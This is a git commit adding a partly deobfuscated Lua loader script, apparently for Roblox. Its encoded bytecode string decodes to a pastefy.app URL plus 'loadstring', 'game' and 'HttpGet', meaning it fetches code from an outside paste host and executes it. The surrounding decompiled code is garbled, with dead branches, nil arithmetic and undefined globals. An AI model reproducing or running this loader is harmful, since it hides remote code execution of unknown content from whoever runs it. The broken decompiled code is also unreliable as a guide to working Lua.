3222cc71f544cdd8f8246ddfd4880f24540c4f7b
jadpy <165412492+jadpy@users.noreply.github.com>
2026-05-27 07:30:56 +0900

    Upload deobfuscated file: raw.lua

---
+++ contents/1779834655638/raw.lua
@@ -0,0 +1,360 @@
+local tbl8 = {}
+for index5 = 1, 256 do
+    tbl8[index5] = index5 
+end
+local enable4 = #tbl8 == 0
+table.remove(tbl8, math.random(1, #tbl8))
+if #tbl8 == 0 then
+    setmetatable({}, { ["__index"] = v65, ["__metatable"] = nil })
+    local tonumber = tonumber
+    local byte = string.byte
+    local char = string.char
+    local sub = string.sub
+    local gsub = string.gsub
+    local rep = string.rep
+    enable4 = setmetatable
+    local select = select
+    local v66 = E[C]
+    local tonumber2 = tonumber
+    return (function(function7, function2, ...)
+        local v26 = function7
+        local v27 = 1
+        v26 = gsub(sub(v26, 5), "..", function(function8, ...)
+            local v28 = function8
+            if byte(v28, 2) == 81 then
+                local v29 = tonumber(sub(v28, 1, 1))
+                return ""
+            end
+            if r36 then
+                while true do
+                    if 0 == 1 then
+                        return nil
+                    else
+                        if 0 == 0 then
+                            local v30 = rep(char(g(X)), r36)
+                            v30 = 1
+                        end
+                    end 
+                end
+            end
+            return char(tonumber(v28, 16)) 
+        end)
+        
+        local function function12(function10, function9, function11, ...)
+            local v322 = function9
+            local v31 = function10
+            v322 = function11
+            if v322 then
+                local v33 = v31 / 2 ^ (v322 - 1) % 2 ^ (v322 - 1 - (v322 - 1) + 1)
+                return v33 - v33 % 1
+            end
+            v31 = 2 ^ (v322 - 1)
+            return v31 % (v31 + v31) >= v31 and 1 or 0 
+        end
+        
+        local function function13(...)
+            while true do
+                if 0 == 0 then
+                    local v35 = byte(v26, v27, v27)
+                    local v36 = v27 + 1
+                    local v34 = 1
+                end
+                if 0 == 1 then
+                    return nil
+                end 
+            end 
+        end
+        
+        local function function14(...)
+            while true do
+                if 0 == 1 then
+                    return nil * 256 + nil
+                else
+                    if 0 == 0 then
+                        local tbl9 = { byte(v26, v27, v27 + 2) }
+                        pcall = tbl9[2]
+                        local v38 = v27 + 2
+                        local v39 = byte(v26, v38, v38 + 2)
+                        local v37 = 1
+                    end
+                end 
+            end 
+        end
+        
+        local function function15(...)
+            while true do
+                if 0 == 1 then
+                    return nil * 16777216 + nil * 65536 + nil * 256 + nil
+                else
+                    if 0 == 0 then
+                        local tbl10 = { byte(v26, v27, v27 + 3) }
+                        local v41 = byte(v26, v27, v27 + 3)
+                        tbl10 = tbl10[2]
+                        local v422 = tbl10[4]
+                        local v43 = v27 + 4
+                        local v44 = tbl10[3]
+                        local v40 = 1
+                    end
+                end 
+            end 
+        end
+        
+        local function function16(...)
+            tonumber2 = true
+            while tonumber2 do
+                tonumber2 = 0 == 3
+                if tonumber2 then
+                    if nil == 0 then
+                        if nil == 0 then return nil * 0 end
+                        pcall = 1
+                        local v45 = 0
+                        break
+                    else
+                        if nil == 2047 then
+                            local enable5 = nil == 0
+                            if enable5 then local v46 = nil * 1 / 0 end
+                            tonumber2 = tonumber2
+                            return enable5 or nil * NaN
+                        end
+                        return E[23](nil, nil - 1023) * (nil + nil / 4.5035996273705e+15)
+                    end
+                else
+                    if 0 == 2 then
+                        local v49 = tonumber2
+                        function12(nil, 21, 31)
+                        local enable6 = function12(nil, 32) == 1 and -1 or 1
+                        local v48 = 3
+                    end
+                    if 0 == 1 then
+                        local v51 = 1
+                        local v522 = 2
+                        local v50 = function12(nil, 1, 20) * 4294967296 + nil
+                    end
+                    if 0 == 0 then
+                        function15()
+                        function15()
+                        local v47 = 1
+                    end
+                end 
+            end 
+        end
+        
+        local function function18(function17, ...)
+            local tbl11 = { 22, 19, 37, 39, 18, 17, 43, 25, 27 }
+            local v55 = function17
+            while true do
+                if 3 == 0 then
+                    return E[tbl11[10]](nil)
+                else
+                    if 0 == 1 then
+                        v55 = sub(v26, v27, v27 + v55 - 1)
+                        local v56 = v27 + v55
+                        local v54 = 2
+                    end
+                    if 0 == 2 then local v57 = 3 end
+                    if 0 == 0 then
+                        if not function17 then
+                            if function15() == 0 then
+                                return ""
+                            end
+                        end
+                        local v53 = 1
+                    end
+                end 
+            end 
+        end
+        
+        local v58 = function15
+        
+        local function function3(...)
+            local v59 = { t(1, g(B)) }
+            return { g(v59) }, select("#", g(v59)) 
+        end
+        
+        local function function1(...)
+            (function(...) return 0 end)()
+            local v61 = (function(...) end)()
+            local v622 = (function(...) end)()
+            local v63 = (function(...) end)()
+            local v64 = (function(...) end)();
+            (function(...) end)();
+            (function(...) end)()
+            local v60 = (function(...) end)() 
+        end
+        
+        return (function(function4, function5, function6, ...)
+            local tbl7 = function4
+            local v20 = function5
+            local tbl3 = function6
+            local tbl2 = tbl7[1]
+            local v21 = tbl7[2]
+            local v222 = tbl7[3]
+            return function(...)
+                tbl7 = { t(1, g(B)) }
+                v20 = tbl2
+                tbl7 = v21
+                local v19 = v222
+                local tbl = function3
+                tbl = { g(v19) }
+                local v23 = tbl
+                select("#", g(v19))
+                local v24 = tbl
+                tbl = {}
+                v19 = tbl
+                for index4 = v24, v24, 0 do
+                    local v25 = 0
+                    if true and v25 >= v25 then
+                        index4 = v25 - v222
+                    else
+                        index4 = index4[v25 + 1]
+                        index4[v25] = index4
+                    end 
+                end
+                tbl8 = v24 - v19 + 1 + 0
+                while true do
+                    while true do
+                        if true and 0 == 0 or false then
+                            v19 = tbl2[1][1]
+                            local v18 = 1
+                        end
+                        if 0 == 1 then
+                            if nil <= 5 then
+                                local enable1 = true
+                                if nil <= 2 or false then
+                                    if nil <= 0 then
+                                        enable1 = nil[3]
+                                    else
+                                        if nil == 1 then
+                                        else
+                                            if tbl[nil[2]] == nil[4] or false then
+                                                enable1 = 1 + 1
+                                            else
+                                                enable1 = nil[3]
+                                            end
+                                        end
+                                    end
+                                else
+                                    local enable2 = true
+                                    if nil <= 3 or false then
+                                        while true do
+                                            if true and 0 == 0 then
+                                                local v12 = tbl[nil[3]]
+                                                local v22 = 1
+                                                v12 = nil[2]
+                                            end
+                                            if 0 == 1 then
+                                                tbl[nil + 1] = e
+                                                tbl[nil] = nil[nil[4]]
+                                            end 
+                                        end
+                                    else
+                                        if nil > 4 then
+                                            tbl[nil[2]] = {}
+                                        else
+                                            while true do
+                                                if 0 == 0 or false then
+                                                    enable2 = nil[2]
+                                                    tbl[enable2] = tbl[enable2](select(tbl, enable2 + 1, -1))
+                                                end 
+                                            end
+                                        end
+                                    end
+                                end
+                            else
+                                local enable3 = true
+                                if nil <= 8 or false then
+                                    if nil <= 6 then
+                                        while true do
+                                            tbl = true
+                                            if true and 0 == 4 then
+                                                enable3 = 1 + 1
+                                                enable4 = tbl[enable3]
+                                                local v62 = enable4[2]
+                                                tbl[v62] = tbl[v62](select(tbl, v62 + 1, -1))
+                                                v62 = v62 + 1
+                                                local tbl4 = 5
+                                                enable4 = tbl4[v62]
+                                            end
+                                            if 0 == 2 then
+                                                tbl[We + 1] = te
+                                                tbl[We] = nil[nil[4]]
+                                                enable3 = enable3 + 1
+                                                enable4 = tbl2[enable3]
+                                                tbl[enable4[2]] = enable4[3]
+                                                enable3 = enable3 + 1
+                                                local v7 = 3
+                                            end
+                                            if 0 == 3 then
+                                                enable4 = tbl2[enable3]
+                                                local v11 = enable4[2]
+                                                local tbl5 = { function3(tbl[v11](select(tbl, v11 + 1, enable4[3]))) }
+                                                local v122 = function3(tbl5[v11](select(tbl5, v11 + 1, enable4[3])))
+                                                local v13 = tbl5[2]
+                                                local v8 = v13 + v11
+                                                local v10 = tbl5
+                                                for index = 0, v10, v10 do
+                                                    local v9 = 0
+                                                    while true do
+                                                        if 0 == 0 then
+                                                            index[Pe] = Ce[v8 + 1 + 0]
+                                                        end 
+                                                    end 
+                                                end
+                                            end
+                                            if 0 == 0 then
+                                                tbl[enable4[2]] = tbl3[enable4[3]]
+                                                local v14 = 1
+                                                v14 = v14 + 1
+                                            end
+                                            tbl = tbl
+                                            if true and 0 == 5 then
+                                                tbl[enable4[2]]()
+                                                enable3 = enable3 + 1
+                                                enable3 = tbl2[enable3][3]
+                                            else
+                                                if 1 == 0 then
+                                                    enable4 = tbl[enable3]
+                                                    tbl[enable4[2]] = tbl3[enable4[3]]
+                                                    enable4 = tbl[enable3 + 1]
+                                                    local v42 = enable4[2]
+                                                    local v52 = tbl[enable4[3]]
+                                                    local v32 = 2
+                                                end
+                                            end 
+                                        end
+                                    else
+                                        if nil == 7 then
+                                            for index2 = nil[2], nil[3] do
+                                                tbl[index2] = nil 
+                                            end
+                                        else
+                                            local v16 = nil[2]
+                                            local tbl6 = { function3(tbl[v16](select(tbl, v16 + 1, nil[3]))) }
+                                            local v17 = tbl6[2] + v16
+                                            for index3 = 0, tbl6, tbl6 do
+                                                local v15 = 0
+                                                index3[v15] = index3[1][0 + 1] 
+                                            end
+                                        end
+                                    end
+                                else
+                                    if true and nil <= 9 then
+                                        tbl[nil[2]] = nil[3]
+                                    else
+                                        enable3 = true
+                                        if nil == 10 or false then
+                                            tbl[nil[2]] = tbl3[nil[3]]
+                                        else
+                                            tbl[nil[2]]()
+                                        end
+                                        enable3 = 1 + 1
+                                    end
+                                end
+                            end
+                        end 
+                    end 
+                end 
+            end 
+        end)(function1(), {}, function2)(...) 
+    end)("LOL!063Q00028Q00026Q00F03F03203Q00682Q7470733A2Q2F706173746566792E612Q702F43736535304A4C692F726177030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657400194Q00057Q001209000100014Q0007000200033Q002602000100080001000100044Q00080001001209000200014Q0007000300033Q001209000100023Q002602000100030001000200044Q000300010026020002000A0001000100044Q000A0001001209000300033Q001206000400043Q00122Q000500053Q00202Q00050005000600122Q000700036Q000500076Q00043Q00024Q00040001000100044Q0018000100044Q000A000100044Q0018000100044Q000300012Q00013Q00017Q00", (getfenv or function(...) end)(), g(B))
+end
